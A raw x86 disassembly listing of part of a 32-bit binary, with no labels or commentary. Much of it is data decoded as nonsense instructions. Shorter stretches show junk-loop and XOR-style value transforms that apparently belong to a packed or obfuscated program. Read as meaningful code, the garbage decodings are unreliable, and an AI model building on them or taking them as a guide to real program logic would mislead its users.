  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	std    
  40a5e6:	xchg   esp,eax
  40a5e7:	cmp    eax,0x70e0d270
  40a5ec:	jo     0x40a583
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a64a
  40a5f2:	xchg   ebx,eax
  40a5f3:	jmp    0x40a5de
  40a5f5:	popf   
  40a5f6:	push   0xb2c87b6f
  40a5fb:	fcomp  DWORD PTR [eax+0x39]
  40a5fe:	inc    edi
  40a5ff:	js     0x40a623
  40a601:	jl     0x40a668
  40a603:	out    dx,eax
  40a604:	push   es
  40a605:	out    0x79,al
  40a607:	cmp    bl,BYTE PTR [edx+0x5e]
  40a60a:	adc    eax,0x6760fc25
  40a60f:	call   0xcd60:0x525ae6c0
  40a616:	mov    ds:0x3e8d7c3a,eax
  40a61b:	icebp  
  40a61c:	out    0xfc,eax
  40a61e:	adc    ebx,DWORD PTR ds:0xd2cc9644
  40a624:	out    0x34,eax
  40a626:	add    ecx,esp
  40a628:	test   DWORD PTR fs:0xdd6e7908,eax
  40a62f:	lahf   
  40a630:	xor    eax,0x8c3f3f13
  40a635:	lods   al,BYTE PTR ds:[esi]
  40a636:	retf   0xd0b8
  40a639:	mov    esi,0x10ed1114
  40a63e:	out    0xd9,al
  40a640:	into   
  40a641:	push   esp
  40a642:	rcl    edi,cl
  40a644:	scas   al,BYTE PTR es:[edi]
  40a645:	bnd ret 
  40a647:	or     al,0xf6
  40a649:	push   bp
  40a64b:	sbb    esi,DWORD PTR [edx-0x6a225b63]
  40a651:	stos   DWORD PTR es:[edi],eax
  40a652:	dec    ebp
  40a653:	fist   DWORD PTR ds:[edx-0x37]
  40a657:	ja     0x40a6c7
  40a659:	jo     0x40a67c
  40a65b:	sub    DWORD PTR [ecx+0x61],ecx
  40a65e:	mov    ss,WORD PTR [eax+esi*8]
  40a661:	add    BYTE PTR [edi],0x4e
  40a664:	imul   edi,DWORD PTR [ecx],0x30f6df31
  40a66a:	test   al,0xca
  40a66c:	inc    ebp
  40a66d:	addr16 jb 0x40a6c7
  40a670:	mov    cl,0xa8
  40a672:	popf   
  40a673:	dec    edi
  40a674:	adc    DWORD PTR [eax-0x25],esp
  40a677:	out    dx,eax
  40a678:	aam    0x8
  40a67a:	sbb    BYTE PTR [esi+ecx*8],dh
  40a67d:	shr    BYTE PTR [ecx+0x74],0x76
  40a681:	fdiv   st,st(7)
  40a683:	adc    eax,0xbb85507d
  40a688:	and    eax,0xa6c35d5e
  40a68d:	stos   DWORD PTR es:[edi],eax
  40a68e:	xchg   edx,eax
  40a68f:	xchg   edi,eax
  40a690:	inc    edx
  40a691:	test   BYTE PTR [ebx+0x9],ch
  40a694:	pop    edi
  40a695:	dec    eax
  40a696:	dec    ebp
  40a697:	fdiv   DWORD PTR [ecx]
  40a699:	loopne 0x40a689
  40a69b:	cmp    BYTE PTR [edx],cl
  40a69d:	dec    ebx
  40a69e:	xor    eax,0x3b8f6ef5
  40a6a3:	mov    esi,0xf1e2cd2a
  40a6a8:	or     cl,ah
  40a6aa:	pop    ss
  40a6ab:	inc    ebx
  40a6ac:	pushf  
  40a6ad:	(bad)  
  40a6ae:	push   ebx
  40a6af:	jg     0x40a65d
  40a6b1:	int3   
  40a6b2:	popa   
  40a6b3:	ret    0xa6a7
  40a6b6:	ss jno 0x40a698
  40a6b9:	push   0x20
  40a6bb:	mov    ds:0xf9e8219a,al
  40a6c0:	outs   dx,DWORD PTR ds:[esi]
  40a6c1:	pop    eax
  40a6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6c3:	push   ecx
  40a6c4:	xor    eax,0x758b24f1
  40a6c9:	call   0xb84e6097
  40a6ce:	xor    al,0x28
  40a6d0:	cld    
  40a6d1:	dec    esp
  40a6d2:	icebp  
  40a6d3:	dec    esp
  40a6d4:	pop    edx
  40a6d5:	mov    ebx,0x8c276a3
  40a6da:	or     al,0x1e
  40a6dc:	in     al,0x79
  40a6de:	fdivr  QWORD PTR [esi]
  40a6e0:	sub    DWORD PTR [edi-0x47],eax
  40a6e3:	rcr    BYTE PTR [ebx+0x4637dbae],0xcd
  40a6ea:	xchg   esp,eax
  40a6eb:	add    DWORD PTR [ebx+0x40],ecx
  40a6ee:	mov    eax,0xeaeecc56
  40a6f3:	idiv   BYTE PTR [ebx-0x2aaca3f6]
  40a6f9:	push   esi
  40a6fa:	aas    
  40a6fb:	xchg   ebx,eax
  40a6fc:	aam    0xb0
  40a6fe:	sub    eax,eax
  40a700:	jno    0x40a697
  40a702:	lock sar dh,cl
  40a705:	cmp    BYTE PTR [eax+ebp*1],ch
  40a708:	mov    bl,0xa6
  40a70a:	mov    al,ds:0xbd6007eb
  40a70f:	sti    
  40a710:	jo     0x40a69b
  40a712:	sbb    BYTE PTR fs:[eax-0x3f5c8d1c],cl
  40a719:	les    edi,FWORD PTR [eax+0x13]
  40a71c:	inc    edi
  40a71d:	(bad)  
  40a71e:	pop    eax
  40a71f:	sbb    al,0xa7
  40a721:	push   edi
  40a722:	clc    
  40a723:	xchg   edi,eax
  40a724:	iret   
  40a725:	sbb    eax,0xffffffeb
  40a728:	jmp    0xb89:0x76eaafda
  40a72f:	sbb    DWORD PTR [edi-0x4f9ee12c],eax
  40a735:	sub    cl,bl
  40a737:	dec    edi
  40a738:	mov    BYTE PTR [ebx+edi*8+0x22],0x4f
  40a73d:	jp     0x40a757
  40a73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a740:	xchg   esp,eax
  40a741:	push   ebx
  40a742:	cmp    DWORD PTR [esp+ecx*8-0x7f9c4e30],0xffffffac
  40a74a:	add    DWORD PTR [edx-0x1e],ecx
  40a74d:	sbb    al,0x2f
  40a74f:	xor    eax,DWORD PTR [edx+0x49]
  40a752:	jbe    0x40a6ef
  40a754:	pushf  
  40a755:	test   BYTE PTR [esi+ebp*2-0x5b],0xcf
  40a75a:	sub    bl,BYTE PTR [edi-0x52]
  40a75d:	add    eax,0xc0e757b9
  40a762:	xchg   DWORD PTR [eax+ecx*1-0xbdc27a3],eax
  40a769:	call   0xf5ddce0d
  40a76e:	ret    
  40a76f:	idiv   edx
  40a771:	xchg   ebx,eax
  40a772:	sub    DWORD PTR [edi+0x75],esi
  40a775:	mov    bl,0x74
  40a777:	and    DWORD PTR ds:0x81181f79,edi
  40a77d:	popf   
  40a77e:	or     dh,cl
  40a780:	jne    0x40a7e4
  40a782:	rcl    al,0x75
  40a785:	loopne 0x40a7cc
  40a787:	xchg   ebx,eax
  40a788:	mov    ebp,0x57167f3b
  40a78d:	jmp    0x40a945
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2-0xd]
  40a79f:	aad    0x94
  40a7a1:	dec    ebx
  40a7a2:	ja     0x40a793
  40a7a4:	jo     0x40a816
  40a7a6:	xchg   ebp,eax
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a7a5
  40a7ab:	mov    esp,0x9a1f776
  40a7b0:	sbb    bl,cl
  40a7b2:	sub    al,0x5f
  40a7b4:	mov    ds:0xf1fef63d,eax
  40a7b9:	ror    BYTE PTR [esi],1
  40a7bb:	push   ebx
  40a7bc:	and    dl,BYTE PTR [edx+0x628e4014]
  40a7c2:	xor    BYTE PTR [esi-0x970cd6a],dl
  40a7c8:	or     DWORD PTR [edx],0xffffffce
  40a7cb:	shl    BYTE PTR [edi],0xc6
  40a7ce:	icebp  
  40a7cf:	mov    ecx,0xd8b83d99
  40a7d4:	lea    edx,[esi]
  40a7d6:	sbb    DWORD PTR [edx+0x536937e],0x3b
  40a7dd:	popf   
  40a7de:	cli    
  40a7df:	pop    ecx
  40a7e0:	jne    0x40a7c9
  40a7e2:	test   al,0x8
  40a7e4:	jmp    0xb807e1f4
  40a7e9:	mov    esi,0xbfd8496f
  40a7ee:	ss jmp 0x40a834
  40a7f1:	lds    eax,FWORD PTR [ecx]
  40a7f3:	or     edx,esi
  40a7f5:	les    esp,FWORD PTR [esi+eax*1]
  40a7f8:	xchg   esi,eax
  40a7f9:	cmp    al,0x32
  40a7fb:	loop   0x40a839
  40a7fd:	shl    bh,1
  40a7ff:	outs   dx,BYTE PTR ds:[esi]
  40a800:	mov    ch,0xdd
  40a802:	mov    BYTE PTR [ebx],0xd0
  40a805:	imul   ebx,DWORD PTR [edx],0x2
  40a808:	cmp    BYTE PTR [eax+0x1d],cl
  40a80b:	jno    0x40a835
  40a80d:	xor    al,BYTE PTR [eax*8+0x7d304af4]
  40a814:	mov    eax,0x7c829f7
  40a819:	jmp    0xcf9cf1f3
  40a81e:	clc    
  40a81f:	dec    esp
  40a820:	mov    dh,0xbc
  40a822:	inc    edi
  40a823:	xchg   ebp,eax
  40a824:	outs   dx,DWORD PTR ds:[esi]
  40a825:	call   FWORD PTR [ecx+eiz*8]
  40a828:	sbb    BYTE PTR [eax-0x77d2bc64],dl
  40a82e:	and    edx,edi
  40a830:	sbb    al,BYTE PTR [edx+esi*2-0x6f]
  40a834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a835:	xchg   esp,eax
  40a836:	sub    eax,0xf4c8a621
  40a83b:	xor    DWORD PTR [esi+0x4f],0xffffffbb
  40a83f:	dec    ebp
  40a840:	test   al,dl
  40a842:	sar    DWORD PTR [esi+edx*8-0x1d],cl
  40a846:	(bad)  
  40a848:	push   edx
  40a849:	loope  0x40a867
  40a84b:	push   ss
  40a84c:	adc    esp,0xaa68b8ea
  40a852:	pop    es
  40a853:	and    bh,BYTE PTR [ebp+0x2fafa9cd]
  40a859:	sbb    esp,DWORD PTR [ecx]
  40a85b:	mov    ebx,0xe022f4c8
  40a860:	add    al,ah
  40a862:	jecxz  0x40a800
  40a864:	mov    ds:0x17cb3349,eax
  40a869:	popf   
  40a86a:	cmp    al,0x4
  40a86c:	les    edx,FWORD PTR [edx+0x3a]
  40a86f:	mov    eax,0xa1a41850
  40a874:	mov    BYTE PTR [esi],cl
  40a876:	dec    eax
  40a877:	mov    bh,0x60
  40a879:	out    dx,eax
  40a87a:	dec    ebp
  40a87b:	fadd   QWORD PTR [ebx+edx*1+0x40969876]
  40a882:	adc    edx,DWORD PTR [esi]
  40a884:	add    DWORD PTR [edx],esi
  40a886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a887:	jb     0x40a8d0
  40a889:	imul   esi,DWORD PTR [edi-0x2c],0xffffff97
  40a88d:	scas   al,BYTE PTR es:[edi]
  40a88e:	dec    ebx
  40a88f:	sti    
  40a890:	xchg   ebx,eax
  40a891:	mov    esp,0x9e01138d
  40a896:	xor    eax,0xd5a1232c
  40a89b:	inc    ebp
  40a89c:	cli    
  40a89d:	fdivr  st(2),st
  40a89f:	int    0x16
  40a8a1:	cmp    dh,BYTE PTR [edx]
  40a8a3:	in     eax,dx
  40a8a4:	mov    esp,esi
  40a8a6:	aad    0xb7
  40a8a8:	push   esp
  40a8a9:	cld    
  40a8aa:	and    edx,DWORD PTR [edx+0x21eaff3]
  40a8b0:	mov    dh,0x6e
  40a8b2:	call   0x9ddf:0x7de2bc01
  40a8b9:	mov    BYTE PTR [esi],ch
  40a8bb:	dec    eax
  40a8bc:	jp     0x40a8b4
  40a8be:	jnp    0x40a863
  40a8c0:	jnp    0x40a889
  40a8c2:	mov    ch,0x30
  40a8c4:	shr    DWORD PTR [edi-0x69],0x3a
  40a8c8:	mov    esi,0xbf116e4b
  40a8cd:	mov    bl,0x85
  40a8cf:	mov    eax,ds:0x83adc969
  40a8d4:	cli    
  40a8d5:	adc    cl,dl
  40a8d7:	test   DWORD PTR [edi-0x387d3b63],esi
  40a8dd:	in     al,0x97
  40a8df:	pop    ds
  40a8e0:	adc    eax,0x4d9ee4db
  40a8e5:	xor    bh,dl
  40a8e7:	repnz cwde 
  40a8e9:	jne    0x40a8db
  40a8eb:	clc    
  40a8ec:	pop    edi
  40a8ed:	dec    DWORD PTR [edx-0x41]
  40a8f0:	js     0x40a921
  40a8f2:	xchg   BYTE PTR [ecx+0x6408612b],ah
  40a8f8:	shr    BYTE PTR [edi],1
  40a8fa:	adc    ch,BYTE PTR [ecx+0x50]
  40a8fd:	out    dx,eax
  40a8fe:	jecxz  0x40a945
  40a900:	stc    
  40a901:	mov    WORD PTR [bx+si-0x2f],cs
  40a905:	push   ss
  40a906:	jns    0x40a900
  40a908:	mov    BYTE PTR [eax],bl
  40a90a:	rcl    eax,0x14
  40a90d:	xor    edx,DWORD PTR [esi+0x11483655]
  40a913:	mov    bl,0xa1
  40a915:	xchg   BYTE PTR [ebx+0x34],bl
  40a918:	jmp    0x40a8fb
  40a91a:	cdq    
  40a91b:	cmc    
  40a91c:	mul    BYTE PTR [edi+eiz*2]
  40a91f:	out    dx,eax
  40a920:	mov    eax,ds:0xdc3af856
  40a925:	dec    eax
  40a926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a927:	outs   dx,DWORD PTR ds:[esi]
  40a928:	loope  0x40a957
  40a92a:	sub    BYTE PTR [edx+0x79],bl
  40a92d:	call   0xb33ac850
  40a932:	add    BYTE PTR [esi],bl
  40a934:	jnp    0x40a8e7
  40a936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a937:	mov    al,0x45
  40a939:	inc    edx
  40a93a:	sub    BYTE PTR [ebp-0x3fde61b5],ch
  40a940:	stos   BYTE PTR es:[edi],al
  40a941:	in     al,0xd0
  40a943:	dec    edx
  40a944:	out    dx,eax
  40a945:	mov    edi,0x32729c
  40a94a:	adc    ebx,DWORD PTR ds:0x432708
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432de2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434421
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432de2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432dca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4326fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4326fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4326fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4326fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4326fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d12
  40a9bb:	cmp    DWORD PTR ds:0x4326fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4326fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4326fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4326f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4326f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4326f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4326f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432c62
  40aa39:	cmp    DWORD PTR ds:0x4326f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4326f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434376,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43437e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43437e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43437e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43437e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43437e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43275d
  40aaa8:	call   DWORD PTR ds:0x432d16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43436e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4343a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432dc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434392
  40aae3:	sbb    DWORD PTR ds:0x4326ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434419,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432de2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434392,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0xdb7cbad5
  40ab36:	std    
  40ab37:	(bad)  
  40ab38:	arpl   WORD PTR [ebp+ebp*8+0x7f957070],cx
  40ab3f:	jo     0x40abb1
  40ab41:	push   eax
  40ab42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab43:	sub    ebx,esi
  40ab45:	in     al,dx
  40ab46:	xor    ecx,DWORD PTR [ecx]
  40ab48:	ror    DWORD PTR [ebp+0x1f8533bc],1
  40ab4e:	je     0x40ab4a
  40ab50:	fild   WORD PTR [esi]
  40ab52:	enter  0xdb78,0x49
  40ab56:	jb     0x40ab8c
  40ab58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab59:	inc    esp
  40ab5a:	call   0x410bde4f
  40ab5f:	out    dx,al
  40ab60:	push   ebx
  40ab61:	jl     0x40ab9d
  40ab63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab64:	push   ecx
  40ab65:	shl    edi,1
  40ab67:	and    ah,BYTE PTR ss:[ebp-0xb76516]
  40ab6e:	and    al,BYTE PTR [edi-0x65]
  40ab71:	out    0x5,eax
  40ab73:	sub    eax,0x96a89236
  40ab78:	dec    ecx
  40ab79:	mov    BYTE PTR [edi+0x1addacd],al
  40ab7f:	daa    
  40ab80:	addr16 pusha 
  40ab82:	ins    BYTE PTR es:[edi],dx
  40ab83:	xchg   ebp,eax
  40ab84:	mov    cl,0xb7
  40ab86:	jle    0x40ab9e
  40ab88:	dec    ecx
  40ab89:	in     al,0x83
  40ab8b:	repnz daa 
  40ab8d:	xchg   ebp,eax
  40ab8e:	jmp    0x46c7:0x2ba1943b
  40ab95:	aaa    
  40ab96:	pop    esp
  40ab97:	mov    WORD PTR [ecx-0x5da3df3c],?
  40ab9d:	dec    ecx
  40ab9e:	(bad)  
  40ab9f:	in     eax,dx
  40aba0:	ficomp WORD PTR [ecx-0x10f79567]
  40aba6:	out    dx,al
  40aba7:	stos   DWORD PTR es:[edi],eax
  40aba8:	in     al,dx
  40aba9:	test   BYTE PTR [eax],cl
  40abab:	mov    ebp,0xdf94a183
  40abb0:	cs arpl ax,ax
  40abb3:	lds    eax,FWORD PTR ds:0x863bb2c
  40abb9:	jmp    0x40ac12
  40abbb:	xlat   BYTE PTR ds:[ebx]
  40abbc:	mov    ebx,0x9347f9a5
  40abc1:	test   DWORD PTR ds:0xa3627dcf,ebp
  40abc7:	out    dx,al
  40abc8:	or     DWORD PTR [edx+edi*4+0x4d],esi
  40abcc:	mov    esi,0x9d4b0ea8
  40abd1:	push   ebx
  40abd2:	retf   
  40abd3:	jecxz  0x40ab74
  40abd5:	mov    esi,0x16267e5a
  40abda:	mov    bl,0x26
  40abdc:	mov    cl,0x2a
  40abde:	ja     0x40ac3d
  40abe0:	or     eax,0x71b0d2d
  40abe5:	icebp  
  40abe6:	leave  
  40abe7:	mov    al,0x4c
  40abe9:	inc    esi
  40abea:	adc    DWORD PTR [edx],0x4a
  40abed:	jb     0x40abef
  40abef:	pop    esp
  40abf0:	ss push esp
  40abf2:	jge    0x40ac0a
  40abf4:	jne    0x40aba3
  40abf6:	jp     0x40ac5b
  40abf8:	aaa    
  40abf9:	sbb    edi,DWORD PTR [esi]
  40abfb:	xchg   ecx,eax
  40abfc:	push   ss
  40abfd:	(bad)  
  40abfe:	loopne 0x40ac07
  40ac00:	test   al,0x2c
  40ac02:	dec    edi
  40ac03:	sub    DWORD PTR [edi],edx
  40ac05:	mov    bl,0x4
  40ac07:	je     0x40ac72
  40ac09:	dec    edx
  40ac0a:	ror    DWORD PTR [edi],0x2d
  40ac0d:	dec    edi
  40ac0e:	sub    ebx,esp
  40ac10:	mov    ch,0x20
  40ac12:	sbb    DWORD PTR [eax-0x5907b26f],ecx
  40ac18:	inc    edx
  40ac19:	ss mov esi,0xda09195
  40ac1f:	mov    esp,0xf38c7add
  40ac24:	iret   
  40ac25:	pop    esi
  40ac26:	push   edx
  40ac27:	xor    edx,DWORD PTR [edx+0x4da1462a]
  40ac2d:	xchg   esp,eax
  40ac2e:	adc    BYTE PTR [ecx-0x29],0x3e
  40ac32:	call   0x2004:0xc0262025
  40ac39:	ds dec dx
  40ac3c:	loop   0x40ac29
  40ac3e:	jge    0x40ac51
  40ac40:	sbb    al,0x97
  40ac42:	inc    edi
  40ac43:	mov    eax,ds:0xd9fa82ab
  40ac48:	arpl   WORD PTR [ebx],bp
  40ac4a:	les    edi,FWORD PTR [edi+0x595e3626]
  40ac50:	xchg   esp,eax
  40ac51:	push   ecx
  40ac52:	lock pop edi
  40ac54:	push   ss
  40ac55:	pop    DWORD PTR [esi-0x2c]
  40ac58:	sub    edi,DWORD PTR [eax-0x3a96f6ee]
  40ac5e:	and    eax,ecx
  40ac60:	popf   
  40ac61:	jmp    0xa5032d75
  40ac66:	fs mov ecx,0x31cf3acf
  40ac6c:	vpshad xmm2,[eax+0x23],xmm5
  40ac72:	mov    DWORD PTR [edx-0x2a76ce52],esi
  40ac78:	cli    
  40ac79:	cmp    DWORD PTR ds:[eax-0x76],edi
  40ac7d:	outs   dx,BYTE PTR ds:[esi]
  40ac7e:	push   esi
  40ac7f:	jmp    0x40ac2e
  40ac81:	jae    0x40accb
  40ac83:	jmp    0x40ac6b
  40ac85:	or     al,0x63
  40ac87:	cli    
  40ac88:	fnstenv [eax-0x1c1b8460]
  40ac8e:	push   ecx
  40ac8f:	add    al,BYTE PTR [esi+0x71]
  40ac92:	push   es
  40ac93:	cmp    esi,eax
  40ac95:	int    0x51
  40ac97:	inc    ebp
  40ac98:	loopne 0x40acfd
  40ac9a:	sbb    bh,BYTE PTR [ebp+0x9d0ff1]
  40aca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aca1:	cmc    
  40aca2:	mov    bl,0x29
  40aca4:	mov    dl,0x1a
  40aca6:	lods   al,BYTE PTR ds:[esi]
  40aca7:	shl    BYTE PTR [eax],1
  40aca9:	dec    ebx
  40acaa:	dec    esp
  40acab:	test   BYTE PTR [ebp-0x368996bd],dl
  40acb1:	xchg   BYTE PTR [ebp+eax*2+0x6e],al
  40acb5:	cli    
  40acb6:	sbb    esp,DWORD PTR [eax+0x444276aa]
  40acbc:	shl    bl,1
  40acbe:	call   0x201f:0x59e17f6e
  40acc5:	stos   DWORD PTR es:[edi],eax
  40acc6:	ja     0x40aca1
  40acc8:	lock shl DWORD PTR es:[ebp-0x17],cl
  40accd:	adc    DWORD PTR [ebp-0x5b537198],esi
  40acd3:	adc    dh,BYTE PTR [ecx+0x72]
  40acd6:	mov    bh,0x98
  40acd8:	sbb    DWORD PTR [ecx+0xe],ebx
  40acdb:	sbb    ecx,DWORD PTR [ebx+0x4d8b0845]
  40ace1:	clc    
  40ace2:	xor    eax,esi
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	les    ebx,FWORD PTR [eax-0x15]
  40ad47:	aad    0x21
  40ad49:	jmp    0x40adbb
  40ad4b:	jo     0x40ace2
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40ace8
  40ad51:	pop    esp
  40ad52:	fstp   TBYTE PTR [ebx-0x7a]
  40ad55:	mov    BYTE PTR [ecx-0x6f490953],bl
  40ad5b:	gs cdq 
  40ad5d:	fcmove st,st(7)
  40ad5f:	mov    DWORD PTR [edi+0x74],esp
  40ad62:	outs   dx,DWORD PTR ds:[esi]
  40ad63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad64:	outs   dx,BYTE PTR ds:[si]
  40ad66:	shl    BYTE PTR [esi+0x44],1
  40ad69:	ror    BYTE PTR [ebx+0x21],1
  40ad6c:	push   cs
  40ad6d:	ret    0x85f2
  40ad70:	adc    al,0xed
  40ad72:	lock xor DWORD PTR [ebx-0x6288e11],esi
  40ad79:	sbb    edi,DWORD PTR [eax+0x49]
  40ad7c:	push   edi
  40ad7d:	fcmovb st,st(3)
  40ad7f:	cld    
  40ad80:	lock jp 0x40ad9a
  40ad83:	leave  
  40ad84:	and    al,0xa
  40ad86:	ficomp DWORD PTR [ebp+0x32]
  40ad89:	or     DWORD PTR [esi-0x7b],ebp
  40ad8c:	enter  0xf19b,0x2
  40ad90:	fisub  DWORD PTR [ebx]
  40ad92:	stos   BYTE PTR es:[edi],al
  40ad93:	fisubr WORD PTR [ecx+0x6f]
  40ad96:	aam    0x83
  40ad98:	mov    ecx,0xbc2093fd
  40ad9d:	inc    esp
  40ad9e:	cmp    eax,0xeb7c1d10
  40ada3:	rol    BYTE PTR [ebx],0x62
  40ada6:	mov    eax,ds:0x519c1383
  40adab:	dec    ebx
  40adac:	vmwrite esp,esi
  40adaf:	xchg   esi,eax
  40adb0:	dec    ebp
  40adb1:	je     0x40ade8
  40adb3:	call   0xa75a0bb8
  40adb8:	repz push esp
  40adba:	or     ch,bl
  40adbc:	push   esi
  40adbd:	xchg   DWORD PTR [esi-0x46],ebx
  40adc0:	push   cs
  40adc1:	test   al,0xf
  40adc3:	dec    ebp
  40adc4:	or     BYTE PTR [eax+0x7f],0x25
  40adc8:	pop    edi
  40adc9:	cdq    
  40adca:	sbb    ebp,DWORD PTR [eax+0x61e4c704]
  40add0:	leave  
  40add1:	ds or  al,0xc0
  40add4:	in     eax,dx
  40add5:	arpl   WORD PTR [edx+eiz*8-0x6437bba4],cx
  40addc:	inc    ecx
  40addd:	ins    BYTE PTR es:[edi],dx
  40adde:	fisub  WORD PTR ds:0x98a41634
  40ade4:	out    dx,al
  40ade5:	jmp    0x85ff:0xff5c4eeb
  40adec:	push   es
  40aded:	sub    eax,DWORD PTR [eax]
  40adef:	rcl    DWORD PTR [eax],1
  40adf1:	dec    esp
  40adf2:	jmp    0x7bcc:0x7be657ac
  40adf9:	jle    0x40addc
  40adfb:	push   esp
  40adfc:	cmc    
  40adfd:	loopne 0x40adbb
  40adff:	mov    ebx,0xa25234b9
  40ae04:	jmp    0xe70a5a1
  40ae09:	mov    esi,0x6a26c42c
